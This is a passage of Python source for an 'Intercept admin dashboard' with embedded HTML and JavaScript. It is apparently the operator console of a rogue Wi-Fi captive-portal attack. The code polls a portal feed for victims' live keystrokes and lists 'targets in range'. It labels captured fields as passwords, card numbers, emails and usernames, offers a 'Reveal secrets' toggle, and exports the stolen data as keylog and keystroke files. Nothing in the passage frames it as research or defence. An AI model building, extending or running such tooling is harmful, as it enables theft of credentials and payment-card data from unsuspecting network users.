  var padL = 34, padB = 22, padT = 12, cw = W - padL - 10, ch = H - padT - padB;
  var grid = cssVar("--line", "#e2e8f0"), dim = cssVar("--dim", "#64748b");
  ctx.clearRect(0, 0, W, H);
  ctx.strokeStyle = grid; ctx.fillStyle = dim; ctx.font = "10px sans-serif"; ctx.lineWidth = 1;
  for(i = 0; i <= 3; i++){
    var y = padT + ch - ch * i / 3;
    ctx.beginPath(); ctx.moveTo(padL, y); ctx.lineTo(padL + cw, y); ctx.stroke();
    ctx.fillText(String(Math.round(max * i / 3)), 4, y + 3);
  }
  var slot = cw / Math.max(1, n), bw = Math.max(2, Math.min(26, slot * 0.62));
  var step = n > 16 ? Math.ceil(n / 8) : 1;
  var tA = Date.now() / 1000;
  var allZero = true, zi;
  for(zi = 0; zi < n; zi++){ if(counts[zi] > 0){ allZero = false; break; } }
  for(i = 0; i < n; i++){
    var h = ch * actShown[i] / max;
    if(allZero) h = 3 + Math.sin(tA * 1.8 + i * 0.55) * 2;
    var x = padL + slot * i + (slot - bw) / 2, y2 = padT + ch - h;
    ctx.fillStyle = (i === n - 1) ? (allZero ? "rgba(60,80,224,.4)" : "#22c55e") : (allZero ? "rgba(60,80,224,.28)" : "#3c50e0");
    if(ctx.roundRect){ ctx.beginPath(); ctx.roundRect(x, y2, bw, Math.max(1, h), 3); ctx.fill(); }
    else ctx.fillRect(x, y2, bw, Math.max(1, h));
    if(i % step === 0 || i === n - 1){
      ctx.fillStyle = dim; ctx.textAlign = "center";
      ctx.fillText(labels[i] || "", padL + slot * i + slot / 2, H - 6);
    }
  }
  actRAF = requestAnimationFrame(drawAct);
}
document.addEventListener("visibilitychange", function(){ if(!document.hidden){ lineKick(); donutKick(); constKick(); actKick(); } });
document.getElementById("act-24").addEventListener("click", function(){
  actMode = "hours";
  this.classList.add("on");
  document.getElementById("act-14").classList.remove("on");
  actKick();
});
document.getElementById("act-14").addEventListener("click", function(){
  actMode = "days";
  this.classList.add("on");
  document.getElementById("act-24").classList.remove("on");
  actKick();
});
document.getElementById("btn-alarm").addEventListener("click", function(){
  alarmOn = !alarmOn;
  this.textContent = "Alarm: " + (alarmOn ? "on" : "off");
  this.classList.toggle("on", alarmOn);
  if(alarmOn){ try{ beep(); }catch(e){} toast("alarm armed — beeps on fresh submits"); }
});
document.getElementById("btn-csv").addEventListener("click", function(){
  if(!lastHist || !Object.keys(lastHist).length){ toast("nothing to export yet"); return; }
  var rows = [["ip", "mac", "hostname", "field", "value", "first_seen", "last_seen"]];
  Object.keys(lastHist).forEach(function(ip){
    var e = lastHist[ip] || {}, fields = e.fields || {};
    Object.keys(fields).forEach(function(fn){
      rows.push([ip, e.mac || "", leases[ip] || "", fn, fields[fn],
                 e.first_ts || "", e.last_ts || ""]);
    });
  });
  var csv = rows.map(function(r){
    return r.map(function(c){ return '"' + String(c == null ? "" : c).replace(/"/g, '""') + '"'; }).join(",");
  }).join("\n");
  var blob = new Blob([csv], {type: "text/csv"});
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "keylog.csv";
  document.body.appendChild(a); a.click();
  setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
  toast((rows.length - 1) + " rows exported");
});
document.addEventListener("click", function(e){
  var t = e.target.closest ? e.target.closest(".copyable") : null;
  if(!t) return;
  var v = t.getAttribute("data-v");
  if(v == null) v = t.textContent;
  function done(){ toast("copied"); }
  try{
    if(navigator.clipboard && navigator.clipboard.writeText)
      navigator.clipboard.writeText(v).then(done, done);
    else{
      var ta = document.createElement("textarea");
      ta.value = v; document.body.appendChild(ta); ta.select();
      try{ document.execCommand("copy"); }catch(_){}
      ta.remove(); done();
    }
  }catch(_){ toast("copy failed"); }
});
function syncDevs(ips){
  var sel = document.getElementById("devsel");
  var cur = sel.value, have = {};
  for(var i = 0; i < sel.options.length; i++) have[sel.options[i].value] = true;
  ips.forEach(function(ip){
    if(!have[ip]){ var o = document.createElement("option"); o.value = ip; o.textContent = ip; sel.appendChild(o); }
  });
  sel.value = cur;
}
function api(path, cb){
  var done = function(ok, status, text){
    var d = null;
    try{ d = JSON.parse(text); }catch(e){ d = text; }
    cb(d, ok, status);
  };
  if(typeof fetch === "function"){
    fetch(path, {cache: "no-store"}).then(function(r){
      return r.text().then(function(t){ done(r.ok, r.status, t); });
    }).catch(function(){ done(false, 0, ""); });
    return;
  }
  try{
    var x = new XMLHttpRequest();
    x.open("GET", path, true);
    x.onreadystatechange = function(){
      if(x.readyState === 4) done(x.status >= 200 && x.status < 300, x.status, x.responseText);
    };
    x.onerror = function(){ done(false, 0, ""); };
    x.send();
  }catch(e){ done(false, 0, ""); }
}
function pollLive(){
  if(paused) return;
  var t0p = Date.now();
  api("/api/live", function(live, ok, status){
    var lat = document.getElementById("lat");
    if(lat) lat.textContent = ok ? (Date.now() - t0p) + " ms" : "—";
    var conn = document.getElementById("conn");
    if(!ok || !live || typeof live !== "object" || Array.isArray(live)){
      conn.textContent = "Portal feed offline — is run.sh running? (spy -> portal " + (status || "?") + ")";
      document.getElementById("pill-txt").textContent = "Offline";
      document.body.classList.remove("live");
      return;
    }
    document.body.classList.add("live");
    var n = Object.keys(live).length;
    conn.textContent = "Tap active — " + n + " target" + (n === 1 ? "" : "s") + " in range";
    document.getElementById("pill-txt").textContent = "Live";
    updateLive(live);
  });
  api("/api/submissions?limit=25", function(t, ok){
    if(ok) updateSubs(t);
  });
}
var tapeFirst = true;
function pollTape(){
  if(paused) return;
  api("/api/tape?since=" + since + "&limit=" + (tapeFirst ? 500 : 100), function(rows, ok){
    tapeFirst = false;
    if(!ok || !Array.isArray(rows) || !rows.length) return;
    rows.forEach(function(r){ if(r && r.epoch && r.epoch > since) since = r.epoch; });
    pushStream(rows);
  });
}
function pollHist(){
  if(paused) return;
  api("/api/history?tail=5000", function(hist, ok){
    if(!ok || !hist || typeof hist !== "object") return;
    updateHist(hist);
  });
}
document.getElementById("btn-pause").addEventListener("click", function(){
  paused = !paused;
  this.textContent = paused ? "Resume" : "Pause";
  this.classList.toggle("on", paused);
  if(!paused){ pollLive(); pollTape(); pollHist(); }
});
document.getElementById("btn-reveal").addEventListener("click", function(){
  reveal = !reveal;
  this.textContent = "Reveal secrets: " + (reveal ? "on" : "off");
  this.classList.toggle("on", reveal);
  pollHist();
});
document.getElementById("btn-export").addEventListener("click", function(){
  api("/api/tape?since=0&limit=500", function(rows, ok){
    if(!ok || !Array.isArray(rows) || !rows.length) return;
    var blob = new Blob([rows.map(function(r){ return JSON.stringify(r); }).join("\n")], {type: "application/json"});
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "keystrokes.jsonl";
    document.body.appendChild(a); a.click();
    setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
  });
});
document.getElementById("btn-theme").addEventListener("click", function(){
  var dark = document.body.classList.toggle("dark");
  try{ localStorage.setItem("iv-theme", dark ? "dark" : "light"); }catch(e){}
});
document.getElementById("hamb").addEventListener("click", function(){
  document.body.classList.toggle("navopen");
});
document.getElementById("scrim").addEventListener("click", function(){
  document.body.classList.remove("navopen");
});
(function(){
  var flt = document.getElementById("flt"), deb = null;
  flt.addEventListener("input", function(){
    if(deb) clearTimeout(deb);
    deb = setTimeout(pollHist, 250);
  });
  document.getElementById("devsel").addEventListener("change", function(){ pollLive(); pollHist(); });
  var links = document.querySelectorAll(".nav a[href^='#']");
  for(var i = 0; i < links.length; i++){
    links[i].addEventListener("click", function(){
      document.body.classList.remove("navopen");
      for(var j = 0; j < links.length; j++) links[j].classList.remove("active");
      this.classList.add("active");
      var v = this.getAttribute("data-view");
      if(v) showView(v);
    });
  }
})();
document.addEventListener("keydown", function(e){
  if(e.key === " " && document.activeElement !== document.getElementById("flt")){ e.preventDefault(); document.getElementById("btn-pause").click(); }
  else if(e.key === "/" && document.activeElement !== document.getElementById("flt")){ e.preventDefault(); document.getElementById("flt").focus(); }
});
setInterval(function(){
  var s = Math.floor((Date.now() - t0) / 1000);
  var p = function(n){ return String(n).padStart(2, "0"); };
  document.getElementById("st-up").textContent = p(Math.floor(s / 60)) + ":" + p(s % 60);
}, 1000);
pollLive(); pollTape(); pollHist(); pollLeases(); pollActivity();
renderStation(true); lineKick(); donutKick(); constKick(); actKick();
setTimeout(function(){ lineKick(); donutKick(); constKick(); actKick(); }, 600);
setInterval(function(){ try{ pollLive(); }catch(e){} }, 1000);
setInterval(function(){ try{ pollTape(); }catch(e){} }, 1000);
setInterval(function(){ try{ pollHist(); }catch(e){} }, 3000);
setInterval(function(){ try{ pollActivity(); }catch(e){} }, 15000);
setInterval(function(){ try{ pollLeases(); }catch(e){} }, 20000);
</script>
</body>
</html>
"""


def proxy(url, timeout=4):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return 502, ("portal feed unreachable: %s" % e).encode()


def _esc(s):
    return _html.escape(str(s if s is not None else ""), quote=False)


def _is_secret(field):
    n = str(field or "").lower()
    return ("pass" in n or "pwd" in n or "secret" in n or "pin" in n
            or "card" in n or "cvv" in n)


def _secret_preview(value):
    s = str(value or "")
    return "[%d chars] %s" % (len(s), "*" * min(len(s), 24)) if s else ""


def _role_badge(field):
    n = str(field or "").lower()
    if ("pass" in n or "pwd" in n or "secret" in n or "pin" in n):
        return '<span class="badge b-red">PASSWORD</span>'
    if "mail" in n:
        return '<span class="badge b-cyan">EMAIL</span>'
    if "card" in n or "cvv" in n or "expire" in n:
        return '<span class="badge b-violet">CARD</span>'
    if "phone" in n or "tel" in n or "mobile" in n:
        return '<span class="badge b-green">PHONE</span>'
    if ("user" in n or "login" in n or "account" in n or "nick" in n):
        return '<span class="badge b-amber">USERNAME</span>'
    return '<span class="badge b-gray">FIELD</span>'


def render_snapshot(base):
    """First paint for / : (conn, live_rows, hist_rows, sub_rows).

    Read from the portal feed so curl / text browsers / no-JS clients still
    see the keylogs. Live browsers replace these blocks via /api/* polls.
    """
    conn = "Connecting to portal feed…"
    live_rows = '<div class="empty" style="grid-column:1/-1">no live typers yet</div>'
    hist_rows = ('<tr><td colspan="5" style="color:var(--faint)">'
                 'nothing logged yet</td></tr>')
    sub_rows = '<div class="empty">none yet</div>'

    lst, ldata = proxy(base + "/live", timeout=2)
    live = None
    if lst == 200:
        try:
            live = json.loads(ldata.decode("utf-8", errors="ignore"))
        except Exception:
            live = None
    names = {}
    nst, ndata = proxy(base + "/leases", timeout=2)
    if nst == 200:
        try:
            got = json.loads(ndata.decode("utf-8", errors="ignore"))
            if isinstance(got, dict):
                names = got
        except Exception:
            pass

    def _dev(ip):
        n = names.get(ip)
        return ("%s · %s" % (n, ip)) if n else ip
    if isinstance(live, dict) and live:
        conn = ("Tap active — %d target%s in range "
                "(snapshot; live updates need JavaScript)"
                % (len(live), "" if len(live) == 1 else "s"))
        cards = []
        for ip in sorted(live,
                         key=lambda i: ((live[i] or {}).get("active_ago")
                                        if (live[i] or {}).get("active_ago")
                                        is not None else 1e9)):
            info = live[ip] or {}
            fields = info.get("fields") or {}
            active = (info.get("live_field")
                      or info.get("active_field") or "-")
            val = info.get("live_value")
            if val is None:
                val = fields.get(active, "")
            val = str(val)
            ago = info.get("active_ago")
            if ago is None:
                tag = '<span class="badge b-gray">idle</span>'
            elif ago <= 3:
                tag = ('<span class="badge b-green"><span class="tdots">'
                       '<span></span><span></span><span></span></span>'
                       'TYPING</span>')
            else:
                tag = '<span class="badge b-amber">%ss ago</span>' % _esc(ago)
            rows = "".join(
                '<div class="frow%s"><span class="fname">%s</span>'
                '<span class="fval">%s</span></div>'
                % (" hot" if k == active else "",
                   _esc(k), _esc(v))
                for k, v in sorted(fields.items()))
            cards.append(
                '<div class="dev"><div class="devhead">'
                '<span class="ip">%s</span><span class="mac">%s</span>'
                '<span class="tag">%s</span></div>'
                '<div class="devwhere">typing in <b>%s</b></div>'
                '<div class="lve"><div class="k">LIVE VALUE — '
                '<b>%s</b></div><div class="v">%s</div>'
                '<div class="m">%d chars · unsubmitted</div></div>'
                '<div>%s</div></div>'
                % (_esc(_dev(ip)), _esc(info.get("mac", "-")), tag,
                   _esc(active), _esc(active),
                   _esc(val[-200:] or "—"), len(val),
                   rows or '<div class="frow"><span class="fname">—'
                           '</span><span class="fval">no fields yet</span>'
                           '</div>'))
        live_rows = "".join(cards)
    elif isinstance(live, dict):
        conn = "Tap active — 0 targets (open the portal on a client and type)"
    else:
        conn = "Portal feed offline — is run.sh running?"
        live_rows = '<div class="empty" style="grid-column:1/-1">portal feed offline</div>'

    hst, hdata = proxy(base + "/history?tail=5000", timeout=2)
    if hst == 200:
        try:
            hist = json.loads(hdata.decode("utf-8", errors="ignore"))
        except Exception:
            hist = None
        if isinstance(hist, dict) and hist:
            ips = sorted(hist.keys(),
                         key=lambda ip: (hist[ip] or {}).get("last_epoch")
                         or 0, reverse=True)
            rows = []
            for ip in ips:
                e = hist[ip] or {}
                for fn, fv in (e.get("fields") or {}).items():
                    shown = (_esc(fv) if not _is_secret(fn)
                             else _esc(_secret_preview(fv)))
                    when = _esc(e.get("last_ts") or "")
                    if e.get("first_ts"):
                        when += ('<br><span style="color:var(--faint);'
                                 'font-size:10px">since %s</span>'
                                 % _esc(str(e["first_ts"])[5:16]))
                    rows.append(
                        '<tr><td class="when">%s</td>'
                        '<td class="ip">%s<br><span style="color:var(--faint);'
                        'font-size:11px">%s</span></td>'
                        '<td class="fd">%s<br><span style="font-size:12px">%s'
                        '</span></td><td class="vl">%s</td>'
                        '<td class="pg">%s<br>%s</td></tr>'
                        % (when, _esc(_dev(ip)),
                           _esc(e.get("mac") or "-"),
                           _role_badge(fn), _esc(fn), shown,
                           _esc(str(e.get("title") or "")[:40]),
                           _esc(str(e.get("page") or "")[-60:])))
                    if len(rows) >= 200:
                        break
                if len(rows) >= 200:
                    break
            hist_rows = ("".join(rows) if rows else
                         '<tr><td colspan="5" style="color:var(--faint)">'
                         '(no field values yet)</td></tr>')

    sst, sdata = proxy(base + "/submissions?limit=25", timeout=2)
    if sst == 200:
        text = sdata.decode("utf-8", errors="ignore").strip()
        lines = [l for l in text.split("\n")
                 if l.strip() and l.strip() != "(none yet)"]
        if lines:
            lines = lines[-25:]
            lines.reverse()
            sub_rows = "".join('<div class="subrow">%s</div>' % _esc(l)
                               for l in lines)
    return conn, live_rows, hist_rows, sub_rows


class Handler(BaseHTTPRequestHandler):
    server_version = "InterceptView/3.0"

    def log_message(self, fmt, *args):
        import sys as _sys
        import time as _time
        _sys.stderr.write("[spy %s] %s %s\n" % (
            _time.strftime("%H:%M:%S"), self.client_address[0],
            fmt % args))
        _sys.stderr.flush()

    def send_data(self, data, ctype, status=200):
        body = data.encode() if isinstance(data, str) else data
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        cfg = self.server.cfg
        base = "http://%s:%d" % (cfg["portal_host"], cfg["portal_port"])
        parsed = urllib.parse.urlparse(self.path)
        path, qs = parsed.path, parsed.query
        if path in ("/", "/index.html"):
            try:
                conn, live_rows, hist_rows, sub_rows = render_snapshot(base)
                page = (PAGE.replace("%%CONN%%", _esc(conn))
                        .replace("%%LIVE_ROWS%%", live_rows)
                        .replace("%%HIST_ROWS%%", hist_rows)
                        .replace("%%SUB_ROWS%%", sub_rows))
            except Exception as e:
                page = (PAGE.replace("%%CONN%%",
                                      "dashboard render error: %s" % _esc(e))
                        .replace("%%LIVE_ROWS%%", "")
                        .replace("%%HIST_ROWS%%", "")
                        .replace("%%SUB_ROWS%%", ""))
            self.send_data(page, "text/html")
        elif path == "/api/live":
            st, data = proxy(base + "/live")
            self.send_data(data, "application/json", st if st == 200 else st)
        elif path == "/api/tape":
            st, data = proxy(base + "/tape?" + qs)
            self.send_data(data, "application/json", st)
        elif path == "/api/history":
            q = urllib.parse.parse_qs(qs)
            try:
                tail = max(100, min(20000, int(q.get("tail", ["5000"])[0])))
            except ValueError:
                tail = 5000
            st, data = proxy(base + "/history?tail=%d" % tail)
            self.send_data(data, "application/json", st)
        elif path == "/api/submissions":
            q = urllib.parse.parse_qs(qs)
            try:
                limit = max(1, min(50, int(q.get("limit", ["25"])[0])))
            except ValueError:
                limit = 25
            st, data = proxy(base + "/submissions?limit=%d" % limit)
            self.send_data(data, "text/plain", st)
        elif path == "/api/leases":
            st, data = proxy(base + "/leases")
            self.send_data(data, "application/json", st)
        elif path == "/api/activity":
            st, data = proxy(base + "/activity?" + qs)
            self.send_data(data, "application/json", st)
        elif path == "/api/portal-info":
            # which portal folder the phone preview is showing
            try:
                pdir, pname = get_portal_dir()
                pentry = resolve_portal_entry(pdir)
                last = _read_kv_conf(os.path.join(REPO_ROOT, "run", "last.conf"))
                info = {"portal": pname, "entry": pentry,
                        "ssid": last.get("SSID", ""),
                        "gateway": last.get("GATEWAY", "")}
                self.send_data(json.dumps(info).encode(), "application/json")
            except Exception as e:
                self.send_data(json.dumps({"error": str(e)}).encode(),
                               "application/json", 500)
        elif path == "/api/portal":
            # exact victim HTML: active portal entry with <base> so the
            # phone iframe renders identically (css/img/js resolve below).
            try:
                _name, _entry, data = load_portal_entry_html()
                self.send_data(data, "text/html")
            except Exception as e:
                self.send_data(("portal preview error: %s" % e).encode(),
                               "text/plain", 500)
        elif path == "/portal-files/" or path.startswith("/portal-files/"):
            # same-origin static assets for the preview iframe
            try:
                pdir, _pname = get_portal_dir()
                rel = urllib.parse.unquote(path[len("/portal-files/"):])
                if not rel:
                    _n, _e, data = load_portal_entry_html()
                    self.send_data(data, "text/html")
                    return
                safe = os.path.normpath(rel)
                if safe.startswith("..") or os.path.isabs(safe):
                    self.send_error(403)
                    return
                full = os.path.join(pdir, safe)
                if os.path.isdir(full):
                    _n, _e, data = load_portal_entry_html()
                    self.send_data(data, "text/html")
                    return
                if not os.path.isfile(full):
                    self.send_error(404)
                    return
                ctype, _enc = mimetypes.guess_type(full)
                with open(full, "rb") as f:
                    data = f.read()
                self.send_data(data, ctype or "application/octet-stream")
            except Exception:
                self.send_error(404)
        else:
            self.send_error(404)


def main():
    ap = argparse.ArgumentParser(description="Intercept admin dashboard")
    ap.add_argument("--portal-host", default="127.0.0.1")
    ap.add_argument("--portal-port", type=int, default=80)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8765)
    args = ap.parse_args()

    server = ThreadingHTTPServer((args.host, args.port), Handler)
    server.cfg = {"portal_host": args.portal_host,
                  "portal_port": args.portal_port}
    print("Intercept dashboard on http://%s:%d/  (portal feed %s:%d)"
          % (args.host, args.port, args.portal_host, args.portal_port),
          flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
